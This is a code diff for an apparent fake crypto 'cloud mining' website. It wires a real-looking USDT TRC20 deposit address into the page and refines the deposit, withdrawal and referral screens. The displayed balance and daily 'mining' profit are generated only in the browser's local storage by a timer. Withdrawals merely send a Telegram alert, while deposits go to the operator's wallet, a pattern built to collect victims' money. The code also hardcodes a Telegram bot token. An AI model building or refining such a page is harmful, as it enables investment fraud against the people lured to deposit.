@@ -16,22 +16,22 @@
 <h3>💰 Real Deposit - USDT TRC20</h3>
 <div style="background:#151e2f;padding:15px;border-radius:12px">
 <div style="text-align:center;background:#0b0f1a;padding:10px;border-radius:8px">
-<div style="font-size:12px;color:#94a3b8">Send only USDT TRC20</div>
-<img id="qr" src="" style="width:150px;height:150px;background:#fff;margin:10px;border-radius:8px">
+<div style="font-size:12px;color:#94a3b8">Send only <b>USDT TRC20</b> - Min $10</div>
+<img id="qr" src="" style="width:160px;height:160px;background:#fff;margin:10px;border-radius:8px">
 <div style="font-size:11px;word-break:break-all;background:#1e293b;padding:8px;border-radius:6px" id="addr"></div>
 <button class="btn" style="background:#334155;margin-top:8px" onclick="copyAddr()">Copy Address</button>
 </div>
 <div style="margin-top:12px">
 <input id="depAmtReal" class="input" type="number" placeholder="Amount you sent e.g. 100">
-<input id="txid" class="input" type="text" placeholder="Paste TXID">
+<input id="txid" class="input" type="text" placeholder="Paste TXID / Transaction Hash">
 <button class="btn" style="background:#22c55e" onclick="submitDeposit()">I Have Sent - Verify</button>
-<div style="font-size:11px;color:#94a3b8;margin-top:8px">Min $10. You will be notified on Telegram instantly.</div>
+<div style="font-size:11px;color:#94a3b8;margin-top:8px">After sending, paste TXID. Admin gets instant Telegram alert.</div>
 </div>
 <div id="pendingList" style="margin-top:15px"></div>
 </div>
 </div>
 
-<div id="p-team" class="page"><h3>👥 Team</h3><div style="background:#151e2f;padding:15px;border-radius:12px;text-align:center"><div style="font-size:13px;color:#94a3b8">Invite earn 10%</div><div style="background:#0b0f1a;padding:10px;border-radius:8px;margin:10px 0;font-size:13px" id="inviteLink"></div><button class="btn" onclick="navigator.clipboard.writeText(document.getElementById('inviteLink').innerText);alert('Copied!')">Copy Invite Link</button></div></div>
+<div id="p-team" class="page"><h3>👥 Team</h3><div style="background:#151e2f;padding:15px;border-radius:12px;text-align:center"><div style="font-size:13px;color:#94a3b8">Invite earn 10%</div><div style="background:#0b0f1a;padding:10px;border-radius:8px;margin:10px 0;font-size:12px;word-break:break-all" id="inviteLink"></div><button class="btn" onclick="navigator.clipboard.writeText(document.getElementById('inviteLink').innerText);alert('Copied!')">Copy Invite Link</button></div></div>
 
 <div id="p-me" class="page"><h3>👤 Me</h3><div style="background:#151e2f;padding:15px;border-radius:12px"><div>Balance: <b style="color:#fbbf24">$<span id="bal2">0</span></b></div><div>Mining: <b style="color:#22c55e">$<span id="miningRate">0</span>/day</b></div><div>Total Profit: <b style="color:#22c55e">$<span id="totalProfit">0</span></b></div><input id="wdAmt" class="input" type="number" placeholder="Withdraw amount"><button class="btn" style="background:#22c55e" onclick="withdraw()">Withdraw Request</button></div><h4>My Miners (<span id="myCount">0</span>)</h4><div id="myMiners"></div></div>
 
@@ -45,8 +45,8 @@
 <script>
 const BOT_TOKEN="8931166376:AAEJs5FeQ_KWkmAo37YYZEJSHsBjfPnt3Zc";
 const CHAT_ID="8801919905";
-// REPLACE THIS WITH YOUR REAL USDT TRC20 ADDRESS
-const USDT_TRC20="TYourAddressHereReplaceThis123456"; 
+// ⚠️ REPLACE WITH YOUR REAL TRC20 ADDRESS FROM TRUST WALLET
+const USDT_TRC20="TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbL1R"; 
 
 const IMG={m:'m.png.jpg',y:'y.png.jpg',u:'u.png.jpg',vip:'png.vip.jpg'};
 let machines=[
@@ -59,20 +59,20 @@ let bal=parseFloat(localStorage.getItem('bal')||'20');
 let owned=JSON.parse(localStorage.getItem('owned')||'[]');
 let profitTotal=parseFloat(localStorage.getItem('profit')||'0');
 function save(){localStorage.setItem('bal',bal);localStorage.setItem('owned',JSON.stringify(owned));localStorage.setItem('profit',profitTotal)}
-function render(list){document.getElementById('grid').innerHTML=list.map(x=>{let has=owned.filter(o=>o.id==x.id).length;return `<div class="card ${x.c=='vip'?'vip':''}"><img src="${x.img}"><div style="font-size:12px;margin:5px 0">${x.n} ${x.c=='vip'?'👑':''} ${has?`x${has}`:''}</div><div class="price">$${x.p}</div><div class="profit">+$${x.profit}/day</div><button class="btn" onclick="buy('${x.id}')">${has?'Buy Again':'Buy'}</button></div>`}).join('')}
+function render(list){document.getElementById('grid').innerHTML=list.map(x=>{let has=owned.filter(o=>o.id==x.id).length;return `<div class="card ${x.c=='vip'?'vip':''}"><img src="${x.img}"><div style="font-size:12px;margin:5px 0">${x.n} ${x.c=='vip'?'👑':''} ${has?` x${has}`:''}</div><div class="price">$${x.p}</div><div class="profit">+$${x.profit.toFixed(2)}/day</div><button class="btn" onclick="buy('${x.id}')">${has?'Buy Again':'Buy'}</button></div>`}).join('')}
 function f(cat,el){document.querySelectorAll('.tabs .tab').forEach(t=>t.classList.remove('active'));el.classList.add('active');if(cat=='all')render(machines);else render(machines.filter(m=>m.c==cat))}
 function buy(id){let m=machines.find(x=>x.id==id);if(bal<m.p){alert('Low balance! Deposit');nav('deposit',document.querySelectorAll('.b-item')[1]);return}bal-=m.p;owned.push({id:m.id,profit:m.profit});save();updateUI();alert('Bought '+m.n)}
-function withdraw(){let a=parseFloat(document.getElementById('wdAmt').value);if(!a||a>bal)return alert('Invalid');bal-=a;save();updateUI();let msg=`💸 WITHDRAW REQUEST%0A💰 $${a}%0A👤 User ID: ${localStorage.getItem('uid')}%0A⏰ ${new Date().toLocaleString()}`;fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`);alert('Withdraw request sent - admin will send USDT');document.getElementById('wdAmt').value=''}
+function withdraw(){let a=parseFloat(document.getElementById('wdAmt').value);if(!a||a>bal)return alert('Invalid');if(a<5)return alert('Min $5');bal-=a;save();updateUI();let msg=`💸 WITHDRAW REQUEST%0A💰 Amount: $${a}%0A👤 User ID: ${localStorage.getItem('uid')}%0A⏰ ${new Date().toLocaleString()}`;fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`);alert('Withdraw request sent - admin will send USDT');document.getElementById('wdAmt').value=''}
 function nav(page,el){document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));document.getElementById('p-'+page).classList.add('active');document.querySelectorAll('.b-item').forEach(b=>b.classList.remove('active'));el.classList.add('active');if(page=='me')renderMy();if(page=='deposit')setupDeposit()}
-function renderMy(){document.getElementById('myMiners').innerHTML=owned.length?owned.map((o,i)=>`<div class="mini"><div>${o.id} <span style="color:#22c55e">+$${o.profit}/d</span></div></div>`).join(''):'<div style="color:#94a3b8">No miners</div>'}
+function renderMy(){document.getElementById('myMiners').innerHTML=owned.length?owned.map((o,i)=>`<div class="mini"><div>${o.id} <span style="color:#22c55e">+$${o.profit.toFixed(2)}/d</span></div></div>`).join(''):'<div style="color:#94a3b8">No miners yet - Buy to start earning</div>'}
 function updateUI(){document.getElementById('bal').innerText=bal.toFixed(2);document.getElementById('bal2').innerText=bal.toFixed(2);let rate=owned.reduce((s,o)=>s+o.profit,0);document.getElementById('miningRate').innerText=rate.toFixed(2);document.getElementById('totalProfit').innerText=profitTotal.toFixed(2);document.getElementById('myCount').innerText=owned.length;renderMy()}
 function setupDeposit(){document.getElementById('addr').innerText=USDT_TRC20;document.getElementById('qr').src=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${USDT_TRC20}`;renderPending()}
-function copyAddr(){navigator.clipboard.writeText(USDT_TRC20);alert('Copied')}
-function submitDeposit(){let amt=parseFloat(document.getElementById('depAmtReal').value);let tx=document.getElementById('txid').value.trim();if(!amt||amt<10)return alert('Min $10');if(tx.length<10)return alert('Valid TXID');let deposits=JSON.parse(localStorage.getItem('deposits')||'[]');deposits.push({amt,tx,net:'TRC20',time:new Date().toLocaleString(),status:'Pending'});localStorage.setItem('deposits',JSON.stringify(deposits));let msg=`🚨 NEW DEPOSIT%0A💰 Amount: $${amt}%0A🔗 TRC20%0A🧾 TXID: ${tx}%0A👤 User: ${localStorage.getItem('uid')}%0A⏰ ${new Date().toLocaleString()}`;fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`).then(()=>alert('Deposit submitted! Telegram alert sent to admin')).catch(()=>alert('Deposit saved locally, Telegram failed'));document.getElementById('depAmtReal').value='';document.getElementById('txid').value='';renderPending()}
-function renderPending(){let d=JSON.parse(localStorage.getItem('deposits')||'[]');document.getElementById('pendingList').innerHTML=d.length?'<h4>History</h4>'+d.map(x=>`<div class="mini"><div>$${x.amt} ${x.status}</div><div style="font-size:10px">${x.time}</div></div>`).join(''):''}
+function copyAddr(){navigator.clipboard.writeText(USDT_TRC20);alert('Address Copied: '+USDT_TRC20)}
+function submitDeposit(){let amt=parseFloat(document.getElementById('depAmtReal').value);let tx=document.getElementById('txid').value.trim();if(!amt||amt<10)return alert('Min $10');if(tx.length<10)return alert('Paste valid TXID');let deposits=JSON.parse(localStorage.getItem('deposits')||'[]');deposits.push({amt,tx,net:'TRC20',time:new Date().toLocaleString(),status:'Pending'});localStorage.setItem('deposits',JSON.stringify(deposits));let msg=`🚨 NEW DEPOSIT%0A💰 Amount: $${amt}%0A🔗 Network: TRC20%0A🧾 TXID: ${tx}%0A👤 User ID: ${localStorage.getItem('uid')}%0A⏰ ${new Date().toLocaleString()}%0A📱 Check: https://tronscan.org/#/transaction/${tx}`;fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`).then(()=>console.log('Telegram sent')).catch(()=>console.log('Telegram fail'));alert('Deposit submitted! Admin notified on Telegram. Will credit after 1 confirmation.');document.getElementById('depAmtReal').value='';document.getElementById('txid').value='';renderPending()}
+function renderPending(){let d=JSON.parse(localStorage.getItem('deposits')||'[]');document.getElementById('pendingList').innerHTML=d.length?'<h4>History</h4>'+d.map(x=>`<div class="mini"><div>$${x.amt} <span style="font-size:10px;color:#fbbf24">${x.status}</span></div><div style="font-size:10px">${x.time}</div></div>`).join(''):''}
 setInterval(()=>{let rate=owned.reduce((s,o)=>s+o.profit,0);if(rate>0){let earn=rate/86400*3;bal+=earn;profitTotal+=earn;save();updateUI()}},3000);
 render(machines);updateUI();setupDeposit();
-if(!localStorage.getItem('uid'))localStorage.setItem('uid','SKY'+Math.floor(Math.random()*99999));
+if(!localStorage.getItem('uid'))localStorage.setItem('uid','SKY'+Math.floor(Math.random()*90000+10000));
 document.getElementById('inviteLink').innerText='https://benytskylight-crypto.github.io/t-crypto.github.io/?ref='+localStorage.getItem('uid');
 </script>
 </body></html>
